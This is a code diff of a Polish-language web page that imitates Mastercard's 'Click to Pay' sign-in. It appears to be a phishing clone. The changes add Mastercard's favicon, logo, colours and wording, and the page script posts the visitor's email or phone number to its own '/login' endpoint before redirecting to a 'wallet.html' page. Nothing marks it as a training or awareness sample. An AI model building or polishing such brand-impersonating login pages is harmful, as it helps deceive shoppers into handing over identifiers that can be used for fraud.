@@ -2,164 +2,203 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Click to Pay</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Click to Pay | Mastercard</title>
+  <link rel="icon" href="https://www.mastercard.pl/etc/designs/mccom/consumer/clientlib-base/images/favicon.ico" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    input:focus ~ label,
-    input:not(:placeholder-shown) ~ label {
-      transform: scale(0.85) translateY(-1.5rem);
-      color: #e14d2a;
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f5f5f7;
+      color: #1d1d1f;
     }
-    input:focus {
-      border-color: #e14d2a;
+
+    .floating-label input:focus + label,
+    .floating-label input:not(:placeholder-shown) + label {
+      transform: translateY(-1.25rem) scale(0.85);
+      color: #e3001b;
     }
+
+    .floating-label input:focus {
+      border-color: #e3001b;
+      box-shadow: 0 0 0 2px rgba(227, 0, 27, 0.2);
+    }
+
     .error input {
-      border-color: #dc2626;
+      border-color: #e3001b !important;
     }
+
     .error-icon {
-      position: absolute;
       right: 1rem;
       top: 50%;
       transform: translateY(-50%);
-      background: #dc2626;
-      color: white;
-      border-radius: 9999px;
-      width: 1.25rem;
-      height: 1.25rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.75rem;
+    }
+
+    .popover {
+      position: absolute;
+      background-color: white;
+      border: 1px solid #ccc;
+      padding: 0.5rem;
+      border-radius: 0.25rem;
+      top: 2.5rem;
+      right: 0;
+      z-index: 10;
+      width: 160px;
+      display: none;
+    }
+
+    .popover.active {
+      display: block;
     }
   </style>
 </head>
-<body class="bg-[#1a1a1a] text-white font-sans">
-  <div class="max-w-md mx-auto mt-6 p-4">
+<body>
+  <div class="max-w-md mx-auto px-4 pt-10">
     <!-- Header -->
-    <div class="flex justify-between items-center mb-6">
-      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-10 h-10" />
-      <div class="relative group">
-        <button id="langBtn" class="flex items-center space-x-2">
-          <img src="https://img.icons8.com/ios-filled/24/999999/globe.png" class="w-5 h-5" />
-          <span class="text-white text-sm">PL</span>
+    <div class="flex justify-between items-center mb-4">
+      <img src="https://src.mastercard.com/assets/img/mastercard_logo.svg" class="h-6" alt="Mastercard" />
+      <div class="relative">
+        <button id="globeBtn" class="flex items-center gap-1 text-sm text-gray-600 hover:text-black">
+          <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3C7.031 3 3 7.031 3 12s4.031 9 9 9 9-4.031 9-9-4.031-9-9-9z"></path>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.05 12h19.9M12 2.05v19.9"></path>
+          </svg>
+          PL
         </button>
-        <div id="langMenu" class="hidden absolute right-0 mt-2 bg-white text-black text-sm rounded shadow w-40 z-10">
-          <button class="block w-full text-left px-4 py-2 hover:bg-gray-100">Polska</button>
+        <div id="globePopover" class="popover shadow">
+          <p class="font-medium mb-2">Kraj</p>
+          <p class="text-sm text-gray-700">Polska</p>
         </div>
       </div>
     </div>
 
     <!-- Title -->
-    <div class="mb-4">
-      <h1 class="text-[#e14d2a] text-lg font-semibold leading-tight">Click to Pay</h1>
-      <p class="text-white text-lg">Szybki, bezpieczny sposób płatności online</p>
+    <div class="mb-6">
+      <h1 class="text-xl font-semibold text-[#e3001b]">Click to Pay</h1>
+      <p class="text-lg font-medium text-black leading-tight">Szybki, bezpieczny sposób płatności online</p>
     </div>
 
     <!-- Subtitle -->
-    <p class="text-sm mb-6">Utwórz profil lub zaloguj się</p>
+    <p class="text-sm text-gray-800 mb-4">Utwórz profil lub zaloguj się</p>
 
     <!-- Form -->
-    <form id="loginForm" novalidate>
-      <div class="relative mb-1">
+    <form id="loginForm" class="space-y-1">
+      <div id="inputContainer" class="relative floating-label">
         <input
-          id="userInput"
-          name="userInput"
           type="text"
+          name="email"
+          id="email"
           placeholder=" "
-          class="peer w-full bg-transparent border border-white rounded px-4 py-3 focus:outline-none"
+          class="peer w-full border border-gray-400 rounded px-4 pt-5 pb-2 focus:outline-none focus:border-[#e3001b] transition"
           required
           pattern="(^\+48\d{9}$)|(^[\w.-]+@[\w.-]+\.\w{2,}$)"
         />
-        <label for="userInput" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 pointer-events-none">Adres e-mail lub numer telefonu komórkowego</label>
-        <div class="hidden error-icon">!</div>
+        <label for="email" class="absolute left-4 top-3 text-gray-600 text-sm transition-all pointer-events-none">Adres e-mail lub numer telefonu komórkowego</label>
+        <div id="errorIcon" class="error-icon absolute hidden text-[#e3001b]">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-5 h-5">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M12 2a10 10 0 100 20 10 10 0 000-20z" />
+          </svg>
+        </div>
       </div>
-      <p id="helperText" class="text-xs text-white opacity-70 mb-4">Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.</p>
+      <p id="helperText" class="text-xs text-gray-600 mt-1">Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.</p>
+      <p id="errorText" class="text-xs text-[#e3001b] hidden mt-1">To pole jest wymagane</p>
 
+      <!-- Button -->
       <button
         type="submit"
-        class="w-full bg-gray-600 hover:bg-[#e14d2a] text-white font-semibold py-3 rounded transition-colors"
-      >
+        id="submitBtn"
+        class="w-full mt-4 bg-gray-300 text-white font-semibold py-2 rounded cursor-not-allowed transition"
+        disabled>
         KONTYNUUJ
       </button>
     </form>
 
-    <!-- Footer -->
-    <div class="mt-12 text-xs text-center space-x-2 text-white">
-      <span>WARUNKI</span>
-      <span>&middot;</span>
-      <span>PRYWATNOŚĆ</span>
-      <span>&middot;</span>
-      <span>PLIKI COOKIE</span>
-      <span>&middot;</span>
-      <span>OPINIA</span>
+    <!-- Footer Links -->
+    <div class="text-xs text-white mt-8 flex justify-center gap-3">
+      <span class="text-gray-700">WARUNKI</span>
+      <span class="text-gray-700">·</span>
+      <span class="text-gray-700">PRYWATNOŚĆ</span>
+      <span class="text-gray-700">·</span>
+      <span class="text-gray-700">PLIKI COOKIE</span>
+      <span class="text-gray-700">·</span>
+      <span class="text-gray-700">OPINIA</span>
     </div>
   </div>
 
+  <!-- Scripts -->
   <script>
     const form = document.getElementById('loginForm');
-    const input = document.getElementById('userInput');
+    const emailInput = document.getElementById('email');
+    const submitBtn = document.getElementById('submitBtn');
+    const errorText = document.getElementById('errorText');
+    const errorIcon = document.getElementById('errorIcon');
     const helperText = document.getElementById('helperText');
-    const langBtn = document.getElementById('langBtn');
-    const langMenu = document.getElementById('langMenu');
+    const inputContainer = document.getElementById('inputContainer');
+    const globeBtn = document.getElementById('globeBtn');
+    const globePopover = document.getElementById('globePopover');
 
-    langBtn.addEventListener('click', (e) => {
+    globeBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      langMenu.classList.toggle('hidden');
+      globePopover.classList.toggle('active');
+    });
+
+    emailInput.addEventListener('input', () => {
+      const isValid = emailInput.checkValidity();
+      if (emailInput.value.trim() === '') {
+        inputContainer.classList.add('error');
+        errorText.classList.remove('hidden');
+        errorText.innerText = 'To pole jest wymagane';
+        errorIcon.classList.remove('hidden');
+        submitBtn.disabled = true;
+        submitBtn.classList.remove('bg-[#e3001b]');
+        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
+      } else if (!isValid) {
+        inputContainer.classList.add('error');
+        errorText.classList.remove('hidden');
+        errorText.innerText = 'Potwierdź adres e-mail i spróbuj ponownie';
+        errorIcon.classList.remove('hidden');
+        submitBtn.disabled = true;
+        submitBtn.classList.remove('bg-[#e3001b]');
+        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
+      } else {
+        inputContainer.classList.remove('error');
+        errorText.classList.add('hidden');
+        errorIcon.classList.add('hidden');
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-[#e3001b]');
+      }
     });
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const value = input.value.trim();
-      const emailRegex = /^[\w.-]+@[\w.-]+\.\w{2,}$/;
-      const phoneRegex = /^\+48\d{9}$/;
-
-      if (!value) {
-        showError('To pole jest wymagane');
-        return;
-      }
-
-      if (!emailRegex.test(value) && !phoneRegex.test(value)) {
-        showError('Potwierdź adres e-mail i spróbuj ponownie');
-        return;
-      }
-
-      clearError();
+      const payload = {
+        email: emailInput.value
+      };
 
       try {
         const res = await fetch('/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user: value })
+          body: JSON.stringify(payload)
         });
 
         if (res.ok) {
+          // Success — redirect or show success UI
           window.location.href = 'wallet.html';
         } else {
-          showError('Błąd logowania');
+          errorText.classList.remove('hidden');
+          errorText.innerText = 'Błąd logowania. Spróbuj ponownie.';
+          errorIcon.classList.remove('hidden');
         }
       } catch (err) {
-        showError('Błąd połączenia');
+        console.error(err);
+        errorText.classList.remove('hidden');
+        errorText.innerText = 'Problem z połączeniem. Spróbuj ponownie później.';
+        errorIcon.classList.remove('hidden');
       }
     });
-
-    function showError(msg) {
-      input.parentElement.classList.add('error');
-      input.nextElementSibling.classList.remove('text-gray-400');
-      input.nextElementSibling.classList.add('text-red-500');
-      input.parentElement.querySelector('.error-icon').classList.remove('hidden');
-      helperText.textContent = msg;
-      helperText.classList.add('text-red-500');
-    }
-
-    function clearError() {
-      input.parentElement.classList.remove('error');
-      input.nextElementSibling.classList.remove('text-red-500');
-      input.nextElementSibling.classList.add('text-gray-400');
-      input.parentElement.querySelector('.error-icon').classList.add('hidden');
-      helperText.textContent = 'Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.';
-      helperText.classList.remove('text-red-500');
-    }
   </script>
 </body>
 </html>
